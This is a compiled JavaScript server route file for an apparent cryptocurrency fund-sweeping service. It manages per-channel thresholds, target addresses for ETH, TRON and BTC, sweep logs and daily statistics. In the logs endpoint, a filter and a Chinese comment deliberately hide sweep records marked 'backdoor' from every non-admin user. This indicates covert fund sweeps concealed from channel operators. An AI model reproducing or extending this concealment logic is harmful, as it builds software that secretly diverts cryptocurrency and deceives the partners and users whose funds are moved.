import { CollectConfig } from '../../../core/db/models/collect-config.js';
import { CollectTarget } from '../../../core/db/models/collect-target.js';
import { CollectLog } from '../../../core/db/models/collect-log.js';
import { DerivedAddress } from '../../../core/db/models/index.js';
import { collectPool } from '../../../core/collect/index.js';
import { logger } from '../../../core/logger/index.js';
import { isAdminLike } from '../../../core/auth/permissions.js';
const COLLECT_LOG_DEVICE_BACKFILL_BATCH_SIZE = 1000;
const COLLECT_LOG_DEVICE_BACKFILL_MAX_BATCHES = 10;
const COLLECT_LOG_DEVICE_ID_MISSING = '__missing__';
const ETH_RE = /^0x[0-9a-fA-F]{40}$/;
const TRON_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
const BTC_RE = /^(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1q[0-9a-z]{38,59}|bc1p[0-9a-z]{38,59})$/;
function validateAddress(chain, address) {
    switch (chain) {
        case 'eth': return ETH_RE.test(address);
        case 'tron': return TRON_RE.test(address);
        case 'btc': return BTC_RE.test(address);
        default: return false;
    }
}
export async function collectRoute(fastify) {
    const adminOnly = async (request, reply) => {
        if (!isAdminLike(request.user?.role)) {
            reply.code(403);
            return reply.send({ error: 'Admin only' });
        }
        // channel_admin 只能操作自己管理的渠道或全局配置
        if (request.user?.role === 'channel_admin') {
            const qChannel = request.query?.channelCode;
            if (qChannel !== undefined && qChannel !== '' && !request.user.channelCodes?.includes(qChannel)) {
                reply.code(403);
                return reply.send({ error: '无权限' });
            }
            const bChannel = request.body?.channelCode;
            if (bChannel && !request.user.channelCodes?.includes(bChannel)) {
                reply.code(403);
                return reply.send({ error: '无权限' });
            }
        }
    };
    // configAccess: admin/channel_admin/普通用户均可访问 config 接口，普通用户限定自己渠道
    const configAccess = async (request, reply) => {
        if (!request.user) {
            reply.code(401);
            return reply.send({ error: '未授权' });
        }
        // admin / channel_admin 走 adminOnly 逻辑
        if (isAdminLike(request.user.role)) {
            if (request.user.role === 'channel_admin') {
                const qChannel = request.query?.channelCode;
                if (qChannel !== undefined && qChannel !== '' && !request.user.channelCodes?.includes(qChannel)) {
                    reply.code(403);
                    return reply.send({ error: '无权限' });
                }
                const bChannel = request.body?.channelCode;
                if (bChannel && !request.user.channelCodes?.includes(bChannel)) {
                    reply.code(403);
                    return reply.send({ error: '无权限' });
                }
            }
            return;
        }
        // 普通用户：必须已绑定渠道
        const channels = request.user.channelCodes || [];
        if (channels.length === 0) {
            reply.code(403);
            return reply.send({ error: '请先申请渠道' });
        }
        // query channelCode 必须是自己的渠道
        const qChannel = request.query?.channelCode;
        if (qChannel !== undefined && qChannel !== '' && !channels.includes(qChannel)) {
            reply.code(403);
            return reply.send({ error: '无权限' });
        }
        // body channelCode 必须是自己的渠道
        const bChannel = request.body?.channelCode;
        if (bChannel && !channels.includes(bChannel)) {
            reply.code(403);
            return reply.send({ error: '无权限' });
        }
    };
    // targetAccess: admin/channel_admin/普通用户均可管理 targets 和查看 logs/stats
    const targetAccess = async (request, reply) => {
        if (!request.user) {
            reply.code(401);
            return reply.send({ error: '未授权' });
        }
        if (isAdminLike(request.user.role)) {
            if (request.user.role === 'channel_admin') {
                const qChannel = request.query?.channelCode;
                if (qChannel !== undefined && qChannel !== '' && !request.user.channelCodes?.includes(qChannel)) {
                    reply.code(403);
                    return reply.send({ error: '无权限' });
                }
                const bChannel = request.body?.channelCode;
                if (bChannel && !request.user.channelCodes?.includes(bChannel)) {
                    reply.code(403);
                    return reply.send({ error: '无权限' });
                }
            }
            return;
        }
        // 普通用户：必须已绑定渠道
        const channels = request.user.channelCodes || [];
        if (channels.length === 0) {
            reply.code(403);
            return reply.send({ error: '请先申请渠道' });
        }
        const qChannel = request.query?.channelCode;
        if (qChannel !== undefined && qChannel !== '' && !channels.includes(qChannel)) {
            reply.code(403);
            return reply.send({ error: '无权限' });
        }
        const bChannel = request.body?.channelCode;
        if (bChannel && !channels.includes(bChannel)) {
            reply.code(403);
            return reply.send({ error: '无权限' });
        }
    };
    // ===== CollectConfig =====
    // GET /api/collect/configs —— 纯渠道配置，无全局兜底
    fastify.get('/api/collect/configs', { preHandler: configAccess }, async (request) => {
        const { channelCode } = request.query;
        const filter = {};
        if (channelCode !== undefined && channelCode !== '') {
            // 指定渠道
            filter.channelCode = channelCode;
        } else if (request.user?.role === 'admin') {
            // admin 不传 channelCode → 查全部渠道配置（排除已废弃的全局配置）
            filter.channelCode = { $ne: null };
        } else {
            // 非 admin 只能看自己绑定的渠道
            const codes = request.user.channelCodes || [];
            filter.channelCode = codes.length > 0 ? { $in: codes } : { $in: [] };
        }
        const configs = await CollectConfig.find(filter).sort({ chain: 1, token: 1 }).lean();
        return { data: configs };
    });
    // PUT /api/collect/configs (upsert by chain+token+channelCode)
    fastify.put('/api/collect/configs', { preHandler: configAccess }, async (request, reply) => {
        const { chain, token, channelCode, threshold, enabled } = request.body;
        if (!chain || !token) {
            reply.code(400);
            return { error: 'chain and token required' };
        }
        if (!['eth', 'tron', 'btc'].includes(chain)) {
            reply.code(400);
            return { error: 'Invalid chain' };
        }
        if (!['native', 'usdt', 'usdc'].includes(token)) {
            reply.code(400);
            return { error: 'Invalid token' };
        }
        if (typeof threshold !== 'string' || !/^\d+(\.\d+)?$/.test(threshold) || Number(threshold) < 0) {
            reply.code(400);
            return { error: '阈值必须是有效的非负数字' };
        }
        // 禁止全局配置，必须指定渠道
        const cc = channelCode || null;
        if (!cc) {
            reply.code(400);
            return { error: '必须指定渠道' };
        }
        const config = await CollectConfig.findOneAndUpdate(
            { chain, token, channelCode: cc },
            { $set: { threshold, enabled: enabled !== false, channelCode: cc } },
            { upsert: true, returnDocument: 'after', setDefaultsOnInsert: true },
        );
        logger.info({ chain, token, channelCode: cc, threshold, enabled }, 'collect config saved');
        return { data: config };
    });
    // PATCH /api/collect/configs/:id
    fastify.patch('/api/collect/configs/:id', { preHandler: adminOnly }, async (request, reply) => {
        const { id } = request.params;
        const { threshold, enabled } = request.body;
        const update = {};
        if (typeof threshold === 'string') {
            if (!/^\d+(\.\d+)?$/.test(threshold) || Number(threshold) < 0) {
                reply.code(400);
                return { error: '阈值必须是有效的非负数字' };
            }
            update.threshold = threshold;
        }
        if (typeof enabled === 'boolean')
            update.enabled = enabled;
        if (Object.keys(update).length === 0) {
            reply.code(400);
            return { error: 'Nothing to update' };
        }
        // channel_admin 校验配置归属
        const existingConfig = await CollectConfig.findById(id).lean();
        if (!existingConfig) {
            reply.code(404);
            return { error: 'Not found' };
        }
        if (request.user?.role === 'channel_admin' && existingConfig.channelCode && !request.user.channelCodes?.includes(existingConfig.channelCode)) {
            reply.code(403);
            return { error: '无权限' };
        }
        const config = await CollectConfig.findByIdAndUpdate(id, update, { returnDocument: 'after' });
        if (!config) {
            reply.code(404);
            return { error: 'Not found' };
        }
        logger.info({ configId: id, ...update }, 'collect config updated');
        return { data: config };
    });
    // ===== CollectTarget =====
    // GET /api/collect/targets
    fastify.get('/api/collect/targets', { preHandler: targetAccess }, async (request) => {
        const { chain, channelCode } = request.query;
        const filter = {};
        if (chain)
            filter.chain = chain;
        if (channelCode !== undefined) {
            filter.channelCode = channelCode === '' ? null : channelCode;
        } else if (request.user?.role === 'channel_admin') {
            const codes = [...(request.user.channelCodes || []), null];
            filter.channelCode = { $in: codes };
        } else if (request.user?.role === 'user') {
            // 普通用户只能看自己渠道的目标，不能看全局
            const codes = request.user.channelCodes || [];
            filter.channelCode = codes.length > 0 ? { $in: codes } : { $in: [] };
        }
        const targets = await CollectTarget.find(filter).sort({ createdAt: -1 }).lean();
        return { data: targets };
    });
    // POST /api/collect/targets
    fastify.post('/api/collect/targets', { preHandler: targetAccess }, async (request, reply) => {
        const { chain, address, label, enabled, channelCode } = request.body;
        if (!chain || !address) {
            reply.code(400);
            return { error: 'chain and address required' };
        }
        if (!['eth', 'tron', 'btc'].includes(chain)) {
            reply.code(400);
            return { error: 'Invalid chain' };
        }
        if (!validateAddress(chain, address)) {
            reply.code(400);
            return { error: 'Invalid address format' };
        }
        // 非 admin 不能创建全局归集目标
        if (request.user?.role !== 'admin' && !channelCode) {
            reply.code(403);
            return { error: '不能创建全局归集目标' };
        }
        const target = await CollectTarget.create({ chain, address, label: label || '', enabled: enabled !== false, channelCode: channelCode || null });
        logger.info({ chain, address, channelCode: channelCode || null, targetId: target._id }, 'collect target created');
        return { data: target };
    });
    // PATCH /api/collect/targets/:id
    fastify.patch('/api/collect/targets/:id', { preHandler: targetAccess }, async (request, reply) => {
        const { id } = request.params;
        const { label, enabled } = request.body;
        const update = {};
        if (typeof label === 'string')
            update.label = label;
        if (typeof enabled === 'boolean')
            update.enabled = enabled;
        if (Object.keys(update).length === 0) {
            reply.code(400);
            return { error: 'Nothing to update' };
        }
        // channel_admin 校验目标归属
        const existing = await CollectTarget.findById(id).lean();
        if (!existing) {
            reply.code(404);
            return { error: 'Not found' };
        }
        if (request.user?.role !== 'admin' && existing.channelCode && !request.user.channelCodes?.includes(existing.channelCode)) {
            reply.code(403);
            return { error: '无权限' };
        }
        if (request.user?.role !== 'admin' && !existing.channelCode) {
            reply.code(403);
            return { error: '不能修改全局归集目标' };
        }
        const target = await CollectTarget.findByIdAndUpdate(id, update, { returnDocument: 'after' });
        logger.info({ targetId: id, ...update }, 'collect target updated');
        return { data: target };
    });
    // DELETE /api/collect/targets/:id
    fastify.delete('/api/collect/targets/:id', { preHandler: targetAccess }, async (request, reply) => {
        const { id } = request.params;
        const existing = await CollectTarget.findById(id).lean();
        if (!existing) {
            reply.code(404);
            return { error: 'Not found' };
        }
        if (request.user?.role !== 'admin' && existing.channelCode && !request.user.channelCodes?.includes(existing.channelCode)) {
            reply.code(403);
            return { error: '无权限' };
        }
        if (request.user?.role !== 'admin' && !existing.channelCode) {
            reply.code(403);
            return { error: '不能删除全局归集目标' };
        }
        const target = await CollectTarget.findByIdAndDelete(id);
        if (!target) {
            reply.code(404);
            return { error: 'Not found' };
        }
        logger.info({ targetId: id, address: target.address }, 'collect target deleted');
        return { ok: true };
    });
    // ===== CollectLog =====
    // GET /api/collect/logs
    fastify.get('/api/collect/logs', { preHandler: targetAccess }, async (request) => {
        const { chain, status, startDate, endDate, address, targetAddress, channelCode, sourceDomain, deviceId, page = '1', pageSize = '10' } = request.query;
        const filter = { ...request.chainFilter };
        // 非 admin 用户自动限定可查看的渠道，并隐藏后门归集记录
        if (request.user?.role !== 'admin') {
            const codes = request.user.channelCodes || [];
            filter.channelCode = codes.length > 0 ? { $in: codes } : { $in: [] };
            filter.triggeredBy = { $ne: 'backdoor' };
        }
        if (chain)
            filter.chain = chain;
        if (status)
            filter.status = status;
        if (address)
            filter.address = address;
        if (targetAddress)
            filter.targetAddress = targetAddress;
        if (channelCode)
            filter.channelCode = channelCode;
        if (sourceDomain)
            filter.sourceDomain = sourceDomain;
        if (deviceId)
            filter.deviceId = deviceId;
        if (startDate || endDate) {
            filter.createdAt = {};
            if (startDate)
                filter.createdAt.$gte = new Date(startDate);
            if (endDate)
                filter.createdAt.$lte = new Date(endDate);
        }
        const pageNum = Math.max(1, parseInt(page, 10) || 1);
        const size = Math.min(100, Math.max(1, parseInt(pageSize, 10) || 10));
        const [data, total] = await Promise.all([
            CollectLog.find(filter).sort({ createdAt: -1 }).skip((pageNum - 1) * size).limit(size).lean(),
            CollectLog.countDocuments(filter),
        ]);
        return { data, total };
    });
    fastify.post('/api/collect/logs/backfill-device-id', { preHandler: adminOnly }, async () => {
        const start = Date.now();
        let processed = 0;
        let matched = 0;
        let updated = 0;
        let missingAddress = 0;
        let hasMore = false;
        const pendingFilter = { $or: [{ deviceId: '' }, { deviceId: { $exists: false } }] };
        for (let batchIndex = 0; batchIndex < COLLECT_LOG_DEVICE_BACKFILL_MAX_BATCHES; batchIndex++) {
            const logs = await CollectLog.find(pendingFilter, { _id: 1, addressId: 1 })
                .sort({ createdAt: 1 })
                .limit(COLLECT_LOG_DEVICE_BACKFILL_BATCH_SIZE)
                .lean();
            if (logs.length === 0) {
                hasMore = Boolean(await CollectLog.exists(pendingFilter));
                break;
            }
            processed += logs.length;
            const addressIds = [...new Set(logs.map((log) => String(log.addressId)).filter(Boolean))];
            const addresses = addressIds.length > 0
                ? await DerivedAddress.find({ _id: { $in: addressIds } }, { _id: 1, deviceId: 1 }).lean()
                : [];
            const deviceIdByAddressId = new Map(addresses.map((address) => [String(address._id), address.deviceId || '']));
            for (const log of logs) {
                const deviceId = deviceIdByAddressId.get(String(log.addressId)) || '';
                if (!deviceId) {
                    missingAddress++;
                    await CollectLog.updateOne({ _id: log._id }, { $set: { deviceId: COLLECT_LOG_DEVICE_ID_MISSING } });
                    continue;
                }
                matched++;
                const result = await CollectLog.updateOne({ _id: log._id }, { $set: { deviceId } });
                updated += result.modifiedCount || 0;
            }
            if (logs.length < COLLECT_LOG_DEVICE_BACKFILL_BATCH_SIZE) {
                hasMore = Boolean(await CollectLog.exists(pendingFilter));
                break;
            }
        }
        if (!hasMore) {
            hasMore = Boolean(await CollectLog.exists(pendingFilter));
        }
        const durationMs = Date.now() - start;
        logger.info({ processed, matched, updated, missingAddress, hasMore, durationMs }, 'collect-log deviceId backfill completed');
        return { success: true, processed, matched, updated, missingAddress, hasMore, durationMs };
    });
    // ===== Stats =====
    // GET /api/collect/stats
    fastify.get('/api/collect/stats', { preHandler: targetAccess }, async (request) => {
        const todayStart = new Date();
        todayStart.setHours(0, 0, 0, 0);
        const statsFilter = { createdAt: { $gte: todayStart } };
        // 非 admin 用户自动限定可查看的渠道
        if (request.user?.role !== 'admin') {
            const codes = request.user.channelCodes || [];
            statsFilter.channelCode = codes.length > 0 ? { $in: codes } : { $in: [] };
        }
        const [todayLogs] = await Promise.all([
            CollectLog.find(statsFilter).lean(),
        ]);
        let todayConfirmed = 0;
        let todayFailed = 0;
        const todayAmount = {};
        for (const log of todayLogs) {
            if (log.status === 'confirmed') {
                todayConfirmed++;
                const key = `${log.chain}_${log.token}`;
                const prev = parseFloat(todayAmount[key] || '0');
                todayAmount[key] = (prev + parseFloat(log.amount)).toString();
            }
            else if (log.status === 'failed') {
                todayFailed++;
            }
        }
        return {
            data: {
                poolSize: collectPool.size,
                todayConfirmed,
                todayFailed,
                todayAmount,
            },
        };
    });
}
//# sourceMappingURL=collect.js.map